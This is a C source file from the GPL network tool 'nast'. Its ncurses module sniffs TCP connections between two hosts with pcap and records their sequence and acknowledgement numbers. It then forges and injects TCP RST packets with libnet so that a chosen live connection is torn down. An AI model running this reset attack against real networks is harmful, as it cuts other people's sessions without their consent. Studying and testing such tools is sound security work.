/*
    nast

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include "n_nast.h"

#ifdef HAVE_LIBNCURSES

# define Rst 0
# define Fin 1
# define Syn 2

int r_add(u_long ip_src,u_long ip_dst,u_short sport,u_short dport, u_long seq, u_long ack, int flag);
int r_del(u_long ip_src,u_long ip_dst,u_short sport,u_short dport, int flag);

int r_nconn = 0;
int r_lines = 1;

int app = 0;

int rst_connection_db(char *dev,u_long ip_src,u_long ip_dst,u_short sport,u_short dport)
{
   char errbuf[256];
   struct libnet_ipv4_hdr *ip;
   struct libnet_tcp_hdr *tcp;
   pcap_t* descr;
   int k;
   
   logd = stdout;
   nmax = 2;

   if((descr=pcap_open_live(dev,BUFSIZ,1,0,errbuf)) == NULL)
     {
	w_error(1, "pcap_open_live: %s", errbuf);
     }

   offset=(device(dev,descr));

   for(k=0;k<30;k++)
     {
	memset(&c_inf[k], 0, sizeof(c_inf[k]));
     }

   init_scr();

   mvwprintw(winfo->win,0,2,"Source");
   mvwprintw(winfo->win,0,21,"Port");
   mvwprintw(winfo->win,0,34,"Destination");
   mvwprintw(winfo->win,0,55,"Port");
   mvwprintw(winfo->win,0,66,"State");
   SAFE_SCROLL_REFRESH(winfo);

   while(rst_glob!=0)
     {

	if ((packet = (u_char *) pcap_next (descr, &hdr))!=NULL)
	  {

	     ip = (struct libnet_ipv4_hdr *) (packet + offset);
	     tcp = (struct libnet_tcp_hdr *) (packet + offset + LIBNET_IPV4_H);

	     if (ip->ip_p == IPPROTO_TCP)
	       {
		  if (!sport && !dport)
		    {
		       if ( ip->ip_src.s_addr == ip_src && ip->ip_dst.s_addr == ip_dst)
			 {
			    switch(tcp->th_flags)
			      {
			       case TH_SYN:
				 r_add(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),Syn);
				 break;
			       case (TH_SYN|TH_ACK):
				 r_add(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case TH_ACK:
			         r_add(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case TH_RST:
				 r_del(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),Rst);
				 break;
			       case (TH_ACK|TH_PUSH):
				 r_add(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case (TH_URG|TH_ACK):
				 r_add(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case (TH_FIN|TH_ACK):
				 r_del(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),Fin);
			       case (TH_RST|TH_ACK):
				 r_del(ip_src,ip_dst,htons(tcp->th_sport),htons(tcp->th_dport),Rst);
				 break;

			       default:
				 break;
			      }
			 }
        		/*caso rovescio */
		       else if ( ip->ip_src.s_addr == ip_dst && ip->ip_dst.s_addr == ip_src )
			 {
			    switch(tcp->th_flags)
			      {
			       case TH_SYN:
				 r_add(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),Syn);
				 break;
			       case (TH_SYN|TH_ACK):
				 r_add(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case TH_ACK:
				 r_add(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case TH_RST:
				 r_del(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),Rst);
				 break;
			       case (TH_ACK|TH_PUSH):
				 r_add(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case (TH_URG|TH_ACK):
				 r_add(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),htonl (tcp->th_seq), htonl (tcp->th_ack),0);
				 break;
			       case (TH_FIN|TH_ACK):
				 r_del(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),Fin);
			       case (TH_RST|TH_ACK):
				 r_del(ip_dst,ip_src,htons(tcp->th_sport),htons(tcp->th_dport),Rst);
				 break;

			       default:
				 break;
			      }
			 }
		    }
	       }

	  }

     }

   pcap_close(descr);

   return 0;
}

int r_add(u_long ip_src,u_long ip_dst,u_short sport,u_short dport, u_long seq, u_long ack, int flag)
{
   int i;
   for(i=0;i<30;i++)
     if((ip_src==c_inf[i].s_ip && ip_dst==c_inf[i].d_ip && sport==c_inf[i].s_port && dport==c_inf[i].d_port && c_inf[i].set) || (ip_src==c_inf[i].d_ip && ip_dst==c_inf[i].s_ip && sport==c_inf[i].d_port && dport==c_inf[i].s_port && c_inf[i].set))
       {
	  c_inf[i].seq=seq;
	  c_inf[i].ack=ack;
	  sf[c_inf[i].pr].seq=seq;
	  sf[c_inf[i].pr].ack=ack;
	  return(0);
       }

   for(i=0;i<30;i++)/*cerco spazio vuoto*/
     {
	if(c_inf[i].s_ip)
	  continue;
	else
	  if(flag!=Syn)
	    return(0);
	else
	  {
	     c_inf[i].s_ip = ip_src;
	     c_inf[i].d_ip = ip_dst;
	     c_inf[i].s_port = sport;
	     c_inf[i].d_port = dport;
	     c_inf[i].seq=seq;
             c_inf[i].ack=ack;
	     c_inf[i].pr=app;

	     mvwprintw(winfo->win,r_lines,2,"%s",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE));
	     mvwprintw(winfo->win,r_lines,21,"%d",c_inf[i].s_port);
	     mvwprintw(winfo->win,r_lines,34,"%s",libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE));
	     mvwprintw(winfo->win,r_lines,55,"%d",c_inf[i].d_port);
	     mvwprintw(winfo->win,r_lines,66,"Work");
	     c_inf[i].lin=r_lines;
	     SAFE_SCROLL_REFRESH(winfo);

	     sprintf(sf[app].string,"%2s%12d%20s%14d         Work",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	     /* create the filter for tcp stream*/
	     sprintf(sf[app].sfilter,"host %s and port %d and host %s and port %d",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	     sf[app].seq=c_inf[i].seq;
	     sf[app].ack=c_inf[i].ack;
	     sf[app].ip_src=c_inf[i].s_ip;
	     sf[app].ip_dst=c_inf[i].d_ip;
	     sf[app].s_port=c_inf[i].s_port;
	     sf[app].d_port=c_inf[i].d_port;

	     sf[i].cont=app;
	     c_inf[i].set=1;
	     r_nconn++;
	     r_lines++;
	     app++;
	     ++nmax;
	     return(1);
	  }
     }
   return(0);
}

int r_del(u_long ip_src,u_long ip_dst,u_short sport,u_short dport, int flag)
{
   int i;

   for(i=0;i<30;i++)
     {
	if(ip_src==c_inf[i].s_ip && ip_dst==c_inf[i].d_ip && sport==c_inf[i].s_port && dport==c_inf[i].d_port)
	  { if(flag){
	     mvwprintw(winfo->win,c_inf[i].lin,2,"%s",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE));
	     mvwprintw(winfo->win,c_inf[i].lin,21,"%d",c_inf[i].s_port);
	     mvwprintw(winfo->win,c_inf[i].lin,34,"%s",libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE));
	     mvwprintw(winfo->win,c_inf[i].lin,55,"%d",c_inf[i].d_port);
	     mvwprintw(winfo->win,c_inf[i].lin,66,"Closed");

	     sprintf(sf[sf[i].cont].string,"%2s%12d%20s%14d         Closed",
		     libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	  }
	     else
	       {
		  mvwprintw(winfo->win,c_inf[i].lin,2,"%s",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE));
		  mvwprintw(winfo->win,c_inf[i].lin,21,"%d",c_inf[i].s_port);
		  mvwprintw(winfo->win,c_inf[i].lin,34,"%s",libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE));
		  mvwprintw(winfo->win,c_inf[i].lin,55,"%d",c_inf[i].d_port);
		  mvwprintw(winfo->win,c_inf[i].lin,66,"Resetted");

		  sprintf(sf[sf[i].cont].string,    "%2s%12d%20s%13d          Resetted",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	       }
	     sprintf(sf[sf[i].cont].sfilter,"host %s and port %d and host %s and port %d",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	     SAFE_SCROLL_REFRESH(winfo);
	     //wrefresh(winfo->win);
	     memset(&c_inf[i], 0, sizeof(c_inf[i]));
	     r_nconn--;

	  }
	else if(ip_src==c_inf[i].d_ip && ip_dst==c_inf[i].s_ip && sport==c_inf[i].d_port && dport==c_inf[i].s_port)
	  { if(flag){
	     mvwprintw(winfo->win,c_inf[i].lin,2,"%s",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE));
	     mvwprintw(winfo->win,c_inf[i].lin,21,"%d",c_inf[i].s_port);
	     mvwprintw(winfo->win,c_inf[i].lin,34,"%s",libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE));
	     mvwprintw(winfo->win,c_inf[i].lin,55,"%d",c_inf[i].d_port);
	     mvwprintw(winfo->win,c_inf[i].lin,66,"Closed");

	     sprintf(sf[sf[i].cont].string,      "%2s%12d%20s%14d         Closed",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	  }
	     else
	       {
		  mvwprintw(winfo->win,c_inf[i].lin,2,"%s",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE));
		  mvwprintw(winfo->win,c_inf[i].lin,21,"%d",c_inf[i].s_port);
		  mvwprintw(winfo->win,c_inf[i].lin,34,"%s",libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE));
		  mvwprintw(winfo->win,c_inf[i].lin,55,"%d",c_inf[i].d_port);
		  mvwprintw(winfo->win,c_inf[i].lin,66,"Resetted");

		  sprintf(sf[sf[i].cont].string,      "%2s%12d%20s%13d         Resetted",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	       }
	     sprintf(sf[sf[i].cont].sfilter,"host %s and port %d and host %s and port %d",libnet_addr2name4(c_inf[i].s_ip, LIBNET_DONT_RESOLVE),c_inf[i].s_port,libnet_addr2name4(c_inf[i].d_ip, LIBNET_DONT_RESOLVE),c_inf[i].d_port);
	     SAFE_SCROLL_REFRESH(winfo);
	     memset(&c_inf[i], 0, sizeof(c_inf[i]));
	     r_nconn--;

	  }

     }
   return -1;
}

int reset_conn(char *dev,u_long s_ip, u_long d_ip, u_short s_port, u_short d_port,u_long seq, u_long ack)
{

   char errbuf[256];

   libnet_t *l;
   u_short n;

   n_print("princ",3,1,0,"- Stoled SEQ (%lu) ACK (%lu)...\n", seq, ack);

   if ((l = libnet_init (LIBNET_RAW4, NULL, errbuf))==NULL)
     {
	w_error(1, "libnet_init: %s\n", errbuf);
     }

   if (libnet_build_tcp (s_port, d_port, seq, ack, TH_RST, 32767, 0, 0, LIBNET_TCP_H, NULL, 0, l, 0)==-1)
     {
	libnet_destroy (l);
	w_error(1, "Error building tcp header : %s\n" ,libnet_geterror(l));
     }

   if (libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H, 0x08, 35320, 0, 64, IPPROTO_TCP, 0,s_ip , d_ip , NULL, 0, l, 0)==-1)
     {
	libnet_destroy (l);
	w_error(1, "Error building ip header : %s\n", libnet_geterror(l));
     }

   for (n = 0; n < 2 ; n++)
     if (libnet_write (l) == -1)
       {
	  libnet_destroy(l);
	  w_error(1, "Error writing packet on wire : %s\n", libnet_geterror(l));
       }
       
   n_print("princ",5,1,0,"- Creating and sending the packet...");

   libnet_destroy(l);
   wattron(princ->win,A_BOLD);
   n_print("princ",7,1,0,"- Connection has been resetted!!\n\n");
      wattroff(princ->win,A_BOLD);

   redrawscrollwin(princ,0);
   return (0);
}

#endif

